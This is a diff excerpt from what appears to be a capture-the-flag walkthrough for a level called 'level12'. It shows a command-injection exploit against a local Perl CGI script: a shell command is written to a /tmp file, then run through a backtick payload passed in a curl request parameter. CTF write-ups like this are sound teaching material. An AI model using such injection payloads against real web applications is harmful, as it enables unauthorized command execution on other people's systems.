@@ -33,11 +33,11 @@ n(t(param("x"), param("y")));
 
 Create a file that contains the command that you want to be launched (here getflag)
 ```bash
-echo "/bin/getflag > /tmp/result" > /tmp/POPPOPPOP
+echo "/bin/getflag > /tmp/result" > /tmp/T
 ```
 
 Then you inject with backstick this file in the x param with curl
 ```bash
-curl 'http://localhost:4646/level12.pl?x=`/???/POPPOPPOP`&y=abc'
+curl 'http://localhost:4646/level12.pl?x=`/???/T`&y=abc'
 ```
 * backsticks specificity: they execute the command to put the result instead
